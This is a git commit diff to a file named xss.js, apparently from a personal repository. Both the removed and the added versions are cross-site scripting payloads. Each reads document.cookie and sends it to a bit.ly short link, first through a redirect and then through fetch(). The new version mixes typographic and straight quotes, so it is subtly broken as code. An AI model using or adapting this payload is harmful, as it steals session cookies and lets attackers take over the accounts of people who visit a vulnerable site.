75388e9aaad167beb055c87a270ae0df968a47b5
Douglas Rodrigues <39203535+DouglasRao@users.noreply.github.com>
2023-04-19 18:40:55 -0300

    xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,11 @@
-location="https://bit.ly/3Hkv2yj?"+document.cookie
+let headersList = {
+ "Accept": “*/*”
+}
+
+let response = await fetch("https://bit.ly/3Hkv2yj?cookie=“+document.cookie, { 
+  method: "GET",
+  headers: headersList
+});
+
+let data = await response.text();
+console.log(data);
